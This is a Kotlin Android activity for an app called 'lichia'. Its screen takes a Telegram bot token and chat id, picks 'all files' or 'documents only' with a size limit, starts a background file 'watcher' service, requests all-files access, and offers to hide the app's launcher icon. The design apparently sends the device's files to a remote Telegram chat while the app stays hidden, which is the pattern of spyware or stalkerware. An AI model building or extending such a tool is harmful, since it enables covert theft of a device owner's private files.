package br.com.lichia.app

import android.app.Activity
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.animation.core.animateFloatAsState
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.clickable
import androidx.compose.foundation.interaction.MutableInteractionSource
import androidx.compose.foundation.interaction.collectIsPressedAsState
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.Row
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.layout.size
import androidx.compose.foundation.layout.width
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.verticalScroll
import androidx.compose.material3.Button
import androidx.compose.material3.ButtonDefaults
import androidx.compose.material3.OutlinedTextField
import androidx.compose.material3.OutlinedTextFieldDefaults
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.runtime.LaunchedEffect
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.produceState
import androidx.compose.runtime.remember
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.graphics.Brush
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.graphics.graphicsLayer
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import kotlinx.coroutines.delay


private val Berry = Color(0xFF14040B)
private val CardBg = Color(0xFF241019)
private val CardStroke = Color(0x33E8507E)
private val Pink = Color(0xFFE8507E)
private val PinkDeep = Color(0xFFC2185B)
private val Leaf = Color(0xFF8BC34A)
private val Cream = Color(0xFFFFF0F3)
private val Muted = Color(0xFFB39CA6)


class MainActivity : ComponentActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContent { LichiaScreen() }
    }


    @Composable
    private fun LichiaScreen() {
        val ctx = LocalContext.current
        val activity = ctx as Activity


        var token by remember { mutableStateOf("") }
        var chat by remember { mutableStateOf("") }
        var maxMb by remember { mutableStateOf("200") }
        var docs by remember { mutableStateOf(false) }

        LaunchedEffect(Unit) {
            val c = Prefs.read(ctx)
            token = c.token
            chat = c.chatId
            maxMb = c.maxMb.toString()
            docs = c.mode == "docs"
        }

        val active by produceState(initialValue = LichiaService.isActive) {
            while (true) {
                delay(1500)
                value = LichiaService.isActive
            }
        }


        Column(
            modifier = Modifier
                .fillMaxSize()
                .background(Berry)
                .verticalScroll(rememberScrollState())
        ) {

            Box(
                modifier = Modifier
                    .fillMaxWidth()
                    .height(190.dp)
                    .background(
                        Brush.verticalGradient(
                            listOf(PinkDeep, Color.Transparent)
                        )
                    ),
                contentAlignment = Alignment.Center
            ) {
                Column(horizontalAlignment = Alignment.CenterHorizontally) {
                    Text(
                        "lichia",
                        fontSize = 46.sp,
                        fontWeight = FontWeight.Black,
                        color = Cream
                    )
                    Spacer(Modifier.height(6.dp))
                    Row(verticalAlignment = Alignment.CenterVertically) {
                        Box(
                            Modifier
                                .size(8.dp)
                                .background(Leaf, CircleShape)
                        )
                        Spacer(Modifier.width(6.dp))
                        Text(" paste · copy · go ", color = Muted, fontSize = 13.sp)
                    }
                }
            }


            Column(
                modifier = Modifier
                    .fillMaxWidth()
                    .padding(20.dp),
                verticalArrangement = Arrangement.spacedBy(14.dp)
            ) {



                Row(
                    modifier = Modifier
                        .fillMaxWidth()
                        .clip(RoundedCornerShape(20.dp))
                        .background(CardBg)
                        .border(1.dp, CardStroke, RoundedCornerShape(20.dp))
                        .padding(vertical = 12.dp),
                    horizontalArrangement = Arrangement.Center
                ) {
                    Box(
                        Modifier
                            .size(9.dp)
                            .background(
                                if (active) Leaf else Muted,
                                CircleShape
                            )
                    )
                    Spacer(Modifier.width(8.dp))
                    Text(
                        if (active) "watcher ativo" else "watcher parado",
                        color = if (active) Leaf else Muted,
                        fontSize = 13.sp,
                        fontWeight = FontWeight.Medium
                    )
                }



                Field("token do bot do telegram", token,
                    { token = it }, masked = true)
                Field("chat id", chat, { chat = it })
                Field("max MB por arquivo", maxMb,
                    { maxMb = it }, number = true)



                Row(horizontalArrangement = Arrangement.spacedBy(10.dp)) {
                    Button(
                        onClick = { docs = false },
                        colors = ButtonDefaults.buttonColors(
                            containerColor = if (!docs) Pink else CardBg,
                            contentColor = if (!docs) Color.White else Muted
                        ),
                        shape = RoundedCornerShape(14.dp),
                        modifier = Modifier.weight(1f)
                    ) { Text("Tudo") }

                    Button(
                        onClick = { docs = true },
                        colors = ButtonDefaults.buttonColors(
                            containerColor = if (docs) Pink else CardBg,
                            contentColor = if (docs) Color.White else Muted
                        ),
                        shape = RoundedCornerShape(14.dp),
                        modifier = Modifier.weight(1f)
                    ) { Text("Apenas documentos") }
                }



                val interaction = remember { MutableInteractionSource() }
                val pressed by interaction.collectIsPressedAsState()
                val scale by animateFloatAsState(
                    if (pressed) 0.96f else 1f, label = "cta"
                )

                Box(
                    modifier = Modifier
                        .fillMaxWidth()
                        .height(58.dp)
                        .graphicsLayer {
                            scaleX = scale
                            scaleY = scale
                        }
                        .clip(RoundedCornerShape(20.dp))
                        .background(Brush.horizontalGradient(listOf(Pink, PinkDeep)))
                        .clickable(interactionSource = interaction,
                                   indication = null) {
                            Prefs.save(
                                ctx, Prefs.Cfg(
                                    token.trim(), chat.trim(),
                                    if (docs) "docs" else "all",
                                    maxMb.trim().toIntOrNull() ?: 200
                                )
                            )
                            ctx.startForegroundService(
                                Intent(ctx, LichiaService::class.java)
                            )
                            if (Build.VERSION.SDK_INT >= 33) {
                                activity.requestPermissions(
                                    arrayOf(android.Manifest.permission
                                        .POST_NOTIFICATIONS), 1)
                            }
                            Toast.makeText(ctx, "lichia ativada",
                                Toast.LENGTH_SHORT).show()
                        },
                    contentAlignment = Alignment.Center
                ) {
                    Text(
                        "salvar e ativar watcher".uppercase(),
                        color = Color.White,
                        fontWeight = FontWeight.Bold,
                        fontSize = 15.sp,
                        letterSpacing = 2.sp
                    )
                }



                GhostButton("conceder acesso a arquivos") {
                    try {
                        startActivity(
                            Intent(
                                Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION,
                                Uri.parse("package:$packageName")
                            )
                        )
                    } catch (e: Exception) {
                        startActivity(
                            Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION)
                        )
                    }
                }

                GhostButton("testar bot") {
                    val tk = token.trim()
                    val ci = chat.trim()
                    Thread {
                        val ok = tk.isNotEmpty() && ci.isNotEmpty() &&
                            TgClient.sendText(tk, ci, "lichia: teste")
                        Handler(Looper.getMainLooper()).post {
                            Toast.makeText(
                                ctx,
                                if (ok) "bot ok" else "falhou",
                                Toast.LENGTH_SHORT
                            ).show()
                        }
                    }.start()
                }

                GhostButton("esconder ícone — reabra por Ajustes → Apps") {
                    packageManager.setComponentEnabledSetting(
                        ComponentName(
                            this@MainActivity,
                            "br.com.lichia.app.Launcher"
                        ),
                        android.content.pm.PackageManager
                            .COMPONENT_ENABLED_STATE_DISABLED,
                        android.content.pm.PackageManager.DONT_KILL_APP
                    )
                    Toast.makeText(ctx, "ícone oculto",
                        Toast.LENGTH_SHORT).show()
                }

                Spacer(Modifier.height(24.dp))
            }
        }
    }


    @Composable
    private fun Field(label: String, value: String, onChange: (String) -> Unit,
                      masked: Boolean = false, number: Boolean = false) {
        OutlinedTextField(
            value = value,
            onValueChange = onChange,
            modifier = Modifier.fillMaxWidth(),
            label = { Text(label, color = Muted, fontSize = 13.sp) },
            singleLine = true,
            visualTransformation = if (masked)
                androidx.compose.ui.text.input.PasswordVisualTransformation()
            else androidx.compose.ui.text.input.VisualTransformation.None,
            keyboardOptions = androidx.compose.foundation.text.KeyboardOptions(
                keyboardType = if (number)
                    androidx.compose.ui.text.input.KeyboardType.Number
                else androidx.compose.ui.text.input.KeyboardType.Text
            ),
            shape = RoundedCornerShape(16.dp),
            colors = OutlinedTextFieldDefaults.colors(
                focusedBorderColor = Pink,
                unfocusedBorderColor = CardStroke,
                cursorColor = Pink,
                focusedTextColor = Cream,
                unfocusedTextColor = Cream,
                focusedContainerColor = CardBg,
                unfocusedContainerColor = CardBg
            )
        )
    }


    @Composable
    private fun GhostButton(label: String, onClick: () -> Unit) {
        Box(
            modifier = Modifier
                .fillMaxWidth()
                .height(50.dp)
                .clip(RoundedCornerShape(16.dp))
                .background(CardBg)
                .border(1.dp, CardStroke, RoundedCornerShape(16.dp))
                .clickable { onClick() },
            contentAlignment = Alignment.Center
        ) {
            Text(label, color = Pink, fontSize = 14.sp, fontWeight = FontWeight.Medium)
        }
    }
}
